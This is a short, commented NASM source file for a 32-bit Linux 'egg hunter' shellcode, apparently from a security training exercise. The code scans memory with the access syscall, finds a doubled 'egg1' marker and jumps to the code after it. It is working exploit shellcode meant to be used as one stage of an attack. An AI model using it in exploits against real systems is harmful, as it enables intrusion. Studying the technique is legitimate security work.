; Filename: eggHunter2.nasm
; Author: citu_adrian@yahoo.com
; Website: itblog.adrian.citu.name

global _start
section .text
_start:
 xor edx,edx
next_page:
 or dx,0xfff
next_adress:
 ;fill edx with 0x1000=4096 
 ;which represents PAGE_SIZE
 inc edx
 ;load the page memory address to ebx
 lea ebx,[edx+0x4]
 ;0x21=33 access system call number
 push byte +0x21
 pop eax
 int 0x80

 ;compare the result with EFAULT
 cmp al,0xf2
 jz next_page 
 mov eax,0x31676765; this is the egg marker: egg1 in hex
 mov edi,edx
 ;search for the first occurrence of the egg tag
 scasd
 jnz next_adress
 ;search for the second occurrence of the egg tag 
 scasd
 jnz next_adress
 ;execute the egg 
 jmp edi
